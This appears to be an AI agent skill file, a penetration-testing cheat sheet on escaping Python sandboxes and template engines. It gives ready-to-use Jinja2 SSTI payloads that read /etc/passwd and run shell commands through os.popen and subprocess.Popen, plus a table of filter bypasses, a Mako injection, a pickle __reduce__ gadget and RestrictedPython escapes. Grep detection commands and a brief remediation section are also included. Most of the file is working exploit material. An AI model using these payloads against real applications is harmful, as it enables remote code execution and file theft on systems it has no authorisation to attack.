---
name: python-sandbox-escape
description: Python sandbox and template engine escape techniques including Jinja2 SSTI, Mako exploitation, serialization attacks, and RestrictedPython bypass.
---

# Python Sandbox Escape Techniques

## 1. Jinja2 SSTI → RCE

**Vulnerable Pattern:** User input passed to `render_template_string()` or Template().

### Detection

```bash
grep -rn "render_template_string\|Template(" --include="*.py"
grep -rn "Environment.*autoescape.*False" --include="*.py"
```

### Core Exploitation Technique

Access Python's object hierarchy to reach dangerous modules:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This gets:
1. `''.__class__` → `<class 'str'>`
2. `.__mro__[1]` → `<class 'object'>`
3. `.__subclasses__()` → List of all classes

### Finding Dangerous Classes

```python
# Search for useful classes
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'warning' in str(cls).lower():
        print(i, cls)  # catch_warnings at ~186
    if 'Popen' in str(cls):
        print(i, cls)  # subprocess.Popen
```

### Common Payloads

```jinja2
# Read files via <class 'warnings.catch_warnings'>
{{ ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}

# RCE via subprocess.Popen (index varies by Python version)
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate()[0] }}

# RCE via os.popen
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Access builtins via lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}

# Via cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### Filter Bypass

| Blocked | Bypass |
|---------|--------|
| `_` | `\x5f` or `request.args.get('x')` where x=_ |
| `.` | `['attr']` or `|attr()` |
| `[]` | `|attr('__getitem__')(0)` |
| `{{}}` | `{% print(...) %}` |
| Quotes | `request.args.x` |

---

## 2. Mako Template Exploitation

**Vulnerable Pattern:** User input in Mako templates.

### Detection

```bash
grep -rn "Template\(.*\\\$\|from mako" --include="*.py"
```

### Exploitation

```mako
${__import__('os').popen('id').read()}
```

---

## 3. Python Serialization RCE

**Vulnerable Pattern:** Deserializing untrusted data with unsafe methods.

### Detection

```bash
# Look for unsafe deserialization
grep -rn "loads\(.*\)" --include="*.py"
grep -rn "marshal.loads\|yaml.load\(" --include="*.py"
```

### Exploitation Concept

Python's object serialization allows defining `__reduce__` method which specifies how to reconstruct an object - this can invoke arbitrary callables.

```python
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.popen, ('id',))

# Serialize and send to vulnerable endpoint
```

---

## 4. RestrictedPython Bypass

**Vulnerable Pattern:** RestrictedPython with weak configuration.

### Detection

```bash
grep -rn "RestrictedPython\|compile_restricted" --include="*.py"
```

### Bypass Techniques

```python
# Access __builtins__ via exception
try:
    1/0
except Exception as e:
    builtins = e.__traceback__.tb_frame.f_globals['__builtins__']

# Via type() metaclass
().__class__.__base__.__subclasses__()
```

---

## 5. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PYTHON SSTI → RCE CHAIN                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Step 1: Confirm SSTI                                                        │
│  └─> {{7*7}} or {{config}}                                                  │
│                                                                              │
│  Step 2: Find useful class index                                            │
│  └─> {{''.__class__.__mro__[1].__subclasses__()}}                          │
│  └─> Search for Popen, catch_warnings, etc.                                │
│                                                                              │
│  Step 3: Access __builtins__ or os module                                   │
│  └─> Via __globals__ attribute                                              │
│  └─> Via config, lipsum, cycler, joiner objects                            │
│                                                                              │
│  Step 4: Run command                                                         │
│  └─> os.popen('cmd').read()                                                 │
│  └─> subprocess.Popen(['cmd'], stdout=-1).communicate()                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Remediation

```python
# Use Jinja2 sandbox
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Or avoid render_template_string entirely
# Use parameterized templates only
return render_template('template.html', name=user_input)
```
